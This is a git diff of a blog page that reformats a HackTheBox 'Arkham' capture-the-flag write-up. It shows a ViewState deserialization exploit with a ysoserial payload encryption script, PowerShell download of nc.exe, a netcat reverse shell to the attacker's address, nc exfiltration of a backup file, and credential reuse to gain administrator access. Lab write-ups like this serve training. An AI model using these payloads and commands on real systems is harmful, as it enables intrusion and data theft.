-<h4 id="viewstatepy-"><code class="highlighter-rouge">viewstate.py</code> :</h4>
+<p><br /> The key is <code class="highlighter-rouge">JsF9876-</code>.
+<br /> We have everything we need to encrypt the data correctly, I wrote a python script to do it. 
+<br /> Basically I’m going to create the payload with <a href="https://github.com/frohoff/ysoserial"><code class="highlighter-rouge">ysoserial</code></a> then use my script to encrypt it.
+<br /> <code class="highlighter-rouge">viewstate.py</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">hmac</span>
@@ -366,10 +361,10 @@ JsF9876-
 		<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Saved to : {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
 </code></pre></div></div>
-<h4 id="this-script-has-two-functions-encrypt-and-hmac_sig-encrypt-takes-the-payload-generated-by-ysoserial-and-des-encrypts-it-using-the-key-then-returns-the-encrypted-payload-hmac_sig-takes-the-encrypted-payload-and-generates-the-hmac-signature-that-will-be-appended-to-the-encrypted-payload">This script has two functions, <code class="highlighter-rouge">encrypt()</code> and <code class="highlighter-rouge">hmac_sig()</code>, <code class="highlighter-rouge">encrypt()</code> takes the payload generated by <code class="highlighter-rouge">ysoserial</code> and <code class="highlighter-rouge">DES</code> encrypts it using the key then returns the encrypted payload. <code class="highlighter-rouge">hmac_sig()</code> takes the encrypted payload and generates the <code class="highlighter-rouge">hmac</code> signature that will be appended to the encrypted payload.</h4>
-<h4 id="the-script-takes-two-arguments-first-one-is-for-the-filename-that-contains-the-ysoserial-generated-payload-it-encrypts-it-then-generates-the-hmac-signature-appends-it-to-the-encrypted-payload-base-64-encodes-the-final-payload-and-url-encodes-it-then-it-saves-the-payload-into-the-output-file-which-is-the-second-argument">The script takes two arguments, first one is for the filename that contains the <code class="highlighter-rouge">ysoserial</code> generated payload, it encrypts it then generates the <code class="highlighter-rouge">hmac</code> signature, appends it to the encrypted payload, base-64 encodes the final payload and <code class="highlighter-rouge">url</code>-encodes it. Then it saves the payload into the output file which is the second argument.</h4>
-<h4 id="time-to-use-ysoserial--we-run-into-the-problem-of-which-payload-to-use-i-used-commonscollections5-and-it-worked">Time to use <code class="highlighter-rouge">ysoserial</code>,  we run into the problem of which payload to use, I used <code class="highlighter-rouge">CommonsCollections5</code> and it worked.</h4>
-<h4 id="i-created-two-payloads-first-one-is-to-download-ncexe-from-my-box-and-save-it-in-cwindowssystem32spooldriverscolor-second-one-is-to-execute-the-reverse-shell-command--ncexe--e-cmdexe-1010xxxx-1337">I created two payloads, first one is to download <code class="highlighter-rouge">nc.exe</code> from my box and save it in <code class="highlighter-rouge">C:\windows\system32\spool\drivers\color</code>, second one is to execute the reverse shell command : <code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1337</code></h4>
+<p><br /> This script has two functions, <code class="highlighter-rouge">encrypt()</code> and <code class="highlighter-rouge">hmac_sig()</code>, <code class="highlighter-rouge">encrypt()</code> takes the payload generated by <code class="highlighter-rouge">ysoserial</code> and <code class="highlighter-rouge">DES</code> encrypts it using the key then returns the encrypted payload. <code class="highlighter-rouge">hmac_sig()</code> takes the encrypted payload and generates the <code class="highlighter-rouge">hmac</code> signature that will be appended to the encrypted payload. 
+<br /> The script takes two arguments, first one is for the filename that contains the <code class="highlighter-rouge">ysoserial</code> generated payload, it encrypts it then generates the <code class="highlighter-rouge">hmac</code> signature, appends it to the encrypted payload, base-64 encodes the final payload and <code class="highlighter-rouge">url</code>-encodes it. Then it saves the payload into the output file which is the second argument.
+<br /> Time to use <code class="highlighter-rouge">ysoserial</code>,  we run into the problem of which payload to use, I used <code class="highlighter-rouge">CommonsCollections5</code> and it worked. 
+<br /> I created two payloads, first one is to download <code class="highlighter-rouge">nc.exe</code> from my box and save it in <code class="highlighter-rouge">C:\windows\system32\spool\drivers\color</code>, second one is to execute the reverse shell command : <code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1337</code></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri "http://10.10.xx.xx/nc.exe" -OutFile "C:\windows\system32\spool\drivers\color\nc.exe"' &gt; uploadnc.payload
 WARNING: An illegal reflective access operation has occurred
 WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
@@ -384,10 +379,10 @@ WARNING: Use --illegal-access=warn to enable warnings of further illegal reflect
 WARNING: All illegal access operations will be denied in a future release
 root@kali:~/Desktop/HTB/boxes/arkham# 
 </code></pre></div></div>
-<h4 id="then-i-encrypted-them-with-my-script-">Then I encrypted them with my script :</h4>
-<p><img src="/images/hackthebox/arkham/10.png" alt="" /></p>
-<h4 id="i-ran-a-python-server-to-host-ncexe-and-i-started-my-nc-listener-on-port-1337-then-i-sent-the-payloads">I ran a python server to host <code class="highlighter-rouge">nc.exe</code> and I started my <code class="highlighter-rouge">nc</code> listener on port 1337, then I sent the payloads.</h4>
-<h4 id="1st-request-">1st Request :</h4>
+<p><br /> Then I encrypted them with my script :
+<img src="/images/hackthebox/arkham/10.png" alt="" />
+<br /> I ran a python server to host <code class="highlighter-rouge">nc.exe</code> and I started my <code class="highlighter-rouge">nc</code> listener on port 1337, then I sent the payloads. 
+<br /> 1st Request :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
 Host: arkham.htb:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -403,7 +398,7 @@ Upgrade-Insecure-Requests: 1
 
 j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
 </code></pre></div></div>
-<h4 id="response-">Response :</h4>
+<p><br /> Response :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
 Content-Type: text/html;charset=utf-8
 Content-Language: en
@@ -423,8 +418,8 @@ Connection: close
         org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
 <span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
 </code></pre></div></div>
-<h4 id="i-got-a-500-and-when-i-checked-my-python-server-i-saw-that-i-got-a-request-so-everything-is-fine">I got a 500, and when I checked my python server I saw that I got a request so everything is fine.</h4>
-<h4 id="2nd-request-">2nd Request :</h4>
+<p><br /> I got a 500, and when I checked my python server I saw that I got a request so everything is fine.
+<br /> 2nd Request :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
 Host: arkham.htb:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -440,7 +435,7 @@ Upgrade-Insecure-Requests: 1
 
 j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
 </code></pre></div></div>
-<h4 id="response--1">Response :</h4>
+<p><br /> Response :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
 Content-Type: text/html;charset=utf-8
 Content-Language: en
@@ -460,10 +455,10 @@ Connection: close
         org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
 <span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
 </code></pre></div></div>
-<h4 id="then-i-checked-my-listener-and-">Then I checked my listener, and :</h4>
-<p><img src="/images/hackthebox/arkham/11.png" alt="" /></p>
-<h4 id="we-owned-user-">We owned user !</h4>
-<h4 id="i-also-scripted-this-because-copying-and-pasting-in-burp-wasnt-my-favorite-thing-and-it-only-takes-2-minutes-to-script-this-in-python-">I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :</h4>
+<p><br /> Then I checked my listener, and :
+<img src="/images/hackthebox/arkham/11.png" alt="" />
+<br /> We owned user !
+<br /> I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 
@@ -480,8 +475,8 @@ Connection: close
 <p><img src="/images/hackthebox/arkham/12.png" alt="" /></p>
 <hr />
 
-<h3 id="shell-as-batman">Shell as Batman</h3>
-<h4 id="we-are-on-the-box-as-alfred-i-enumerated-the-directories-and-found-a-directory-called-backups-in-cusersalfreddownloads-it-had-a-zip-archive-called-backupzip-">We are on the box as <code class="highlighter-rouge">Alfred</code>, I enumerated the directories and found a directory called <code class="highlighter-rouge">backups</code> in <code class="highlighter-rouge">C:\Users\Alfred\Downloads</code>, It had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">backup.zip</code> :</h4>
+<h2 id="shell-as-batman">Shell as Batman</h2>
+<p><br /> We are on the box as <code class="highlighter-rouge">Alfred</code>, I enumerated the directories and found a directory called <code class="highlighter-rouge">backups</code> in <code class="highlighter-rouge">C:\Users\Alfred\Downloads</code>, It had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">backup.zip</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred\Downloads&gt;dir
 dir
  Volume in drive C has no label.
@@ -513,12 +508,12 @@ dir
 
 C:\Users\Alfred\Downloads\backups&gt;
 </code></pre></div></div>
-<h4 id="i-wanted-to-get-it-on-my-box-so-i-used-nc-to-do-it-i-listened-on-port-1338-then-on-the-box-i-did-this">I wanted to get it on my box so I used <code class="highlighter-rouge">nc</code> to do it. I listened on port 1338, then on the box I did this:</h4>
+<p><br /> I wanted to get it on my box so I used <code class="highlighter-rouge">nc</code> to do it. I listened on port 1338, then on the box I did this:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred\Downloads\backups&gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             
 C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   
 C:\Users\Alfred\Downloads\backups&gt;
 </code></pre></div></div>
-<h4 id="and-i-successfully-got-the-file-">And I successfully got the file :</h4>
+<p><br /> And I successfully got the file :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# nc -lp 1338 &gt; backup.zip                                                                    
 root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
 total 132
@@ -527,7 +522,7 @@ drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..
 -rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip
 root@kali:~/Desktop/HTB/boxes/arkham/backups#
 </code></pre></div></div>
-<h4 id="the-archive-only-had-a-file-called-alfredarkhamlocalost-which-is-an-outlook-email-folder-so-i-used-readpst-to-convert-it">The archive only had a file called <code class="highlighter-rouge">alfred@arkham.local.ost</code> which is an outlook email folder so I used <code class="highlighter-rouge">readpst</code> to convert it.</h4>
+<p><br /> The archive only had a file called <code class="highlighter-rouge">alfred@arkham.local.ost</code> which is an outlook email folder so I used <code class="highlighter-rouge">readpst</code> to convert it.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# unzip backup.zip 
 Archive:  backup.zip
   inflating: alfred@arkham.local.ost  
@@ -560,7 +555,7 @@ Processing Folder "Server Failures"
   "Drafts" - 1 items done, 0 items skipped.
 root@kali:~/Desktop/HTB/boxes/arkham/backups# 
 </code></pre></div></div>
-<h4 id="the-output-was-saved-in-draftsmbox-i-removed-the-long-useless-output-">The output was saved in <code class="highlighter-rouge">Drafts.mbox</code>, I removed the long useless output :</h4>
+<p><br /> The output was saved in <code class="highlighter-rouge">Drafts.mbox</code>, I removed the long useless output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
 total 16608
 drwxr-xr-x 2 root root     4096 Aug  9 21:33 .
@@ -762,16 +757,16 @@ AQIE5hP4/wjr8uh7Wbf/AAAAAElFTkSuQmCC
 
 ----boundary-LibPST-iamunique-672158152_-_---
 </code></pre></div></div>
-<h4 id="we-can-see-two-interesting-things-here-first-one-is-this-message--master-wayne-stop-forgetting-your-password-and-second-one-is-the-base-64-encoded-image-i-decoded-it-and-saved-it-">We can see two interesting things here, first one is this message : <code class="highlighter-rouge">Master Wayne stop forgetting your password</code> and second one is the base-64 encoded image. I decoded it and saved it :</h4>
+<p><br /> We can see two interesting things here, first one is this message : <code class="highlighter-rouge">Master Wayne stop forgetting your password</code> and second one is the base-64 encoded image. I decoded it and saved it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# nano image001.png.b64
 root@kali:~/Desktop/HTB/boxes/arkham/backups# base64 -d image001.png.b64 &gt; image001.png
 root@kali:~/Desktop/HTB/boxes/arkham/backups# file image001.png
 image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
 root@kali:~/Desktop/HTB/boxes/arkham/backups# 
 </code></pre></div></div>
-<h4 id="image001png-"><code class="highlighter-rouge">image001.png</code> :</h4>
-<p><img src="/images/hackthebox/arkham/13.png" alt="" /></p>
-<h4 id="great-we-have-the-password-for-batman-by-checking-the-local-group-memberships-of-batman-we-can-see-that-batman-is-in-the-administrators-group-and-also-in-the-remote-management-users-group-">Great, we have the password for <code class="highlighter-rouge">Batman</code>. By checking the local group memberships of <code class="highlighter-rouge">Batman</code> we can see that <code class="highlighter-rouge">Batman</code> is in the Administrators group, and also in the Remote management users group :</h4>
+<p><br /> <code class="highlighter-rouge">image001.png</code> :
+<img src="/images/hackthebox/arkham/13.png" alt="" />
+<br /> Great, we have the password for <code class="highlighter-rouge">Batman</code>. By checking the local group memberships of <code class="highlighter-rouge">Batman</code> we can see that <code class="highlighter-rouge">Batman</code> is in the Administrators group, and also in the Remote management users group :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net user batman
 net user batman
 User name                    Batman
@@ -804,7 +799,7 @@ The command completed successfully.
 
 C:\&gt;
 </code></pre></div></div>
-<h4 id="so-we-can-use-powershells-invoke-command-with-the-credentials-we-have-to-get-a-reverse-shell--">So we can use <code class="highlighter-rouge">powershell</code>’s <code class="highlighter-rouge">Invoke-Command</code> with the credentials we have to get a reverse shell  :</h4>
+<p><br /> So we can use <code class="highlighter-rouge">powershell</code>’s <code class="highlighter-rouge">Invoke-Command</code> with the credentials we have to get a reverse shell  :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;powershell
 powershell
 Windows PowerShell
@@ -825,8 +820,8 @@ Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.e
 <br /></p>
 <hr />
 
-<h3 id="root-flag">Root Flag</h3>
-<h4 id="batman-is-in-the-administrators-group-however-i-couldnt-read-the-flag-"><code class="highlighter-rouge">Batman</code> is in the Administrators group, however I couldn’t read the flag :</h4>
+<h2 id="root-flag">Root Flag</h2>
+<p><br /> <code class="highlighter-rouge">Batman</code> is in the Administrators group, however I couldn’t read the flag :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Batman\Documents&gt;cd ../../Administrator/Desktop
 cd ../../Administrator/Desktop
 Access is denied.
@@ -837,54 +832,151 @@ Access is denied.
 
 C:\Users\Batman\Documents&gt;
 </code></pre></div></div>
-<h4 id="that-was-weird-after-trying-a-lot-of-things-i-wanted-to-see-if-anything-will-change-if-i-mounted-c-then-accessed-it">That was weird, after trying a lot of things I wanted to see If anything will change if I mounted <code class="highlighter-rouge">C$</code> then accessed it.</h4>
+<p><br /> That was weird, after trying a lot of things I wanted to see If anything will change if I mounted <code class="highlighter-rouge">C$</code> then accessed it.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net use Z: \\ARKHAM\C$
 net use Z: \\ARKHAM\C$
 The command completed successfully.
 </code></pre></div></div>
-<h4 id="and-yes-that-worked-">And yes that worked :</h4>
-<p><img src="/images/hackthebox/arkham/15.png" alt="" /></p>
-<h4 id="we-owned-root-">We owned root !</h4>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
